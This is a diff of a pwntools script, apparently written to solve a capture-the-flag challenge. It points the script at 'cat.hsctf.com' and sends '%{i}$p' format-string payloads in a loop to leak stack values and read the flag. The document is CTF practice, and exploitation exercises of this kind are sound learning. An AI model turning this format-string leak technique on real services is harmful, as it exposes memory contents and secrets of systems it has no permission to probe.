@@ -7,9 +7,8 @@ from pwn import *
 exe = './chall'
 elf = context.binary = ELF(exe, checksec=False)
 context.log_level = 'warn'
-host = 'chall.server'
+host = 'cat.hsctf.com'
 port = 1337
-
 
 # =========================================================
 #                           FUZZ
@@ -17,16 +16,15 @@ port = 1337
 
 flag = ''
 
-for i in range(0, 100): # Range is obtained by fuzzing locally 
+for i in range(0, 30): # Range is obtained by fuzzing locally 
     try:
+        # io = process(exe)
         # Connect to server
         io = remote(host, port)
         # Format the payload to location on stack
-        io.sendlineafter(b'>', f'%{i}$p'.encode())
-        # receive unneccesary lines 
-        io.recvuntil(b'  ')
+        io.sendline(f'%{i}$p'.encode())
         # receive leaked
-        leak = io.recv()
+        leak = io.recvline()
         # ignore nulls
         if not b'(nil)' in leak:
             # print value if exist
